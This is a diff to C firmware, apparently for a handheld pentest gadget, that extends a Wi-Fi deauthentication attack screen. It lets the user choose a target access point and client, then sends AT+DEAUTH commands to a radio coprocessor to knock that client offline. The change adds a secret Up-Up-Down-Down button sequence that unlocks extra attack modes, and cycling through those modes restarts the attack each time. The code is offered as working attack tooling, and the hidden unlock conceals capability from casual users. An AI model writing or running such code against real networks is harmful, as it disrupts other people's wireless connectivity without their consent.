@@ -54,12 +54,41 @@ static bool s_stascan_active = false;
 static bool s_deauth_active = false;
 static bool s_redraw = false;
 
+static uint8_t s_deauth_enable_mode = 1;
+
+// Deauth status as returned by AT+DEAUTH?
+static uint8_t s_at_deauth_channel = 0;
+static uint8_t s_at_deauth_enable_mode = 0;
+static uint8_t s_at_deauth_enable_num_modes = 0;
+
 #define PREFLIGHT_AT_CHECKS 2
 static char PREFLIGHT_AT_COMMANDS[PREFLIGHT_AT_CHECKS][MAX_SIZE_NAME] = { "AT+DEAUTH?", "AT+STASCAN?" };
 static uint8_t s_failed_preflight_tests = 0;
 
+#define KEYSEQ_MAX 4
+static game_button_t s_keyseq_map[KEYSEQ_MAX] = { GAME_BTN_UP, GAME_BTN_UP, GAME_BTN_DOWN, GAME_BTN_DOWN};
+static uint8_t s_keyseq_level = 0;
+static bool s_keyseq_unlocked = false;
+
 /********************* H E L P E R S ****************************************/
 
+// Advanced mode unlock key sequence
+static void check_keyseq(game_button_t btn) {
+    if (s_keyseq_unlocked)
+        return;
+
+    if  (btn == s_keyseq_map[s_keyseq_level]) {
+        if (s_keyseq_level == KEYSEQ_MAX - 1) {
+            s_keyseq_unlocked = true;
+            s_redraw = true;
+            m1_buzzer_notification();
+        } else {
+            s_keyseq_level++;
+        }
+    } else {
+        s_keyseq_level = 0;
+    }
+}
 
 static void add_ap(char *name, char *address, uint8_t channel) {
     if (s_list_count >= MAX_LIST_ITEMS) {
@@ -158,6 +187,10 @@ static void parse_stascan(const char *line) {
     add_station(address);
 }
 
+// Process deauth query responses and record if a deauth is active, which which wifi channel
+//    is used, current deauth enable mode and get number of available deauth enable modes
+//
+// Example query AT response: +DEAUTH:(1,1,3,9)
 static void parse_query_deauth(const char *line) {
     int active;
 
@@ -167,12 +200,29 @@ static void parse_query_deauth(const char *line) {
 
     /* Parse state */
     active = (int)strtol(p, NULL, 10);
-
-    if (active == 1) {
+    if (active > 0) {
         s_deauth_active = true;
     } else {
         s_deauth_active = false;
     }
+
+    /* Parse channel */
+    p = strchr(p, ',');
+    if (!p) return;
+    p++;
+    s_at_deauth_channel = (uint8_t)strtol(p, NULL, 10);
+
+    /* Parse enable mode */
+    p = strchr(p, ',');
+    if (!p) return;
+    p++;
+    s_at_deauth_enable_mode = (uint8_t)strtol(p, NULL, 10);
+
+    /* Parse num_modes */
+    p = strchr(p, ',');
+    if (!p) return;
+    p++;
+    s_at_deauth_enable_num_modes = (uint8_t)strtol(p, NULL, 10);
 }
 
 static void parse_query_stascan(const char *line) {
@@ -185,7 +235,7 @@ static void parse_query_stascan(const char *line) {
     /* Parse state */
     active = (int)strtol(p, NULL, 10);
 
-    if (active == 1) {
+    if (active > 0) {
         s_stascan_active = true;
     } else {
         s_stascan_active = false;
@@ -263,6 +313,8 @@ static void show_message(const char *title, const char *line1, const char *line2
 
 static void draw_attack(u8g2_t *u8g2)
 {
+    char prn_msg[128];
+
     m1_u8g2_firstpage();
     draw_title_bar(TITLE_DEFAULT);
 
@@ -272,10 +324,13 @@ static void draw_attack(u8g2_t *u8g2)
     u8g2_SetFont(u8g2, M1_DISP_SUB_MENU_FONT_B);
     m1_draw_text(u8g2, 78, 28, 46, s_deauth_active ? "ON" : "OFF", TEXT_ALIGN_LEFT);
 
-    u8g2_SetFont(u8g2, M1_DISP_FUNC_MENU_FONT_N);
-    m1_draw_text(u8g2, 4, 48, 120, "Press OK to toggle", TEXT_ALIGN_CENTER);
+    u8g2_SetFont(u8g2, u8g2_font_5x8_tr);
+    if (s_keyseq_unlocked) {
+        snprintf(prn_msg, sizeof(prn_msg), "Mode: %u (Up/Down)", s_deauth_enable_mode);
+        m1_draw_text(u8g2, 4, 38, 120, prn_msg, TEXT_ALIGN_CENTER);
+    }
 
-    u8g2_SetFont(&m1_u8g2, u8g2_font_6x10_tr);
+    m1_draw_text(u8g2, 4, 48, 120, "Press OK to toggle", TEXT_ALIGN_CENTER);
     m1_draw_bottom_bar(u8g2, arrowleft_8x8, "Back", "End", arrowright_8x8);
     m1_u8g2_nextpage();
 
@@ -464,7 +519,7 @@ static void deauth_start(uint8_t channel, char *bssid, char *mac) {
 	char resp_buf[AT_RESP_BUF_SIZE];
     char at_cmd[128];
 
-    snprintf(at_cmd, sizeof(at_cmd), "AT+DEAUTH=1,%d,\"%s\",\"%s\"\r\n", channel, bssid, mac);
+    snprintf(at_cmd, sizeof(at_cmd), "AT+DEAUTH=%u,%d,\"%s\",\"%s\"\r\n", s_deauth_enable_mode, channel, mac, bssid);
     resp_buf[0] = 0;
     spi_AT_send_recv(at_cmd, resp_buf, sizeof(resp_buf), 3);
 
@@ -808,7 +863,7 @@ void lab_test_deauth(void)
                 stascan_stop();
             } else if (btn == GAME_BTN_RIGHT) {
                 if (s_list_count > 0) {
-                    strncpy(s_selected_sta, s_list_items[selection].address, MAX_SIZE_ADDRESS);
+                    memcpy(s_selected_sta, s_list_items[selection].address, MAX_SIZE_ADDRESS);
                     s_state++;
 
                     stascan_stop();
@@ -853,6 +908,30 @@ void lab_test_deauth(void)
             btn = game_poll_button(INPUT_POLL_DELAY);
             if (btn == GAME_BTN_BACK) {
                 break;
+            } else if (btn == GAME_BTN_UP) {
+                if (s_keyseq_unlocked && s_at_deauth_enable_num_modes > 0) {
+                    if (s_deauth_enable_mode < s_at_deauth_enable_num_modes)
+                        s_deauth_enable_mode++;
+                    else
+                        s_deauth_enable_mode = 1;
+
+                    s_redraw = true;
+                    deauth_start(s_selected_ap.channel, s_selected_ap.address, s_selected_sta);
+                } else {
+                    check_keyseq(GAME_BTN_UP);
+                }
+            } else if (btn == GAME_BTN_DOWN) {
+                if (s_keyseq_unlocked && s_at_deauth_enable_num_modes > 0) {
+                    if (s_deauth_enable_mode > 1)
+                        s_deauth_enable_mode--;
+                    else
+                        s_deauth_enable_mode = s_at_deauth_enable_num_modes;
+
+                    s_redraw = true;
+                    deauth_start(s_selected_ap.channel, s_selected_ap.address, s_selected_sta);
+                } else {
+                    check_keyseq(GAME_BTN_DOWN);
+                }
             } else if (btn == GAME_BTN_LEFT) {
                 s_state--;
                 deauth_stop();
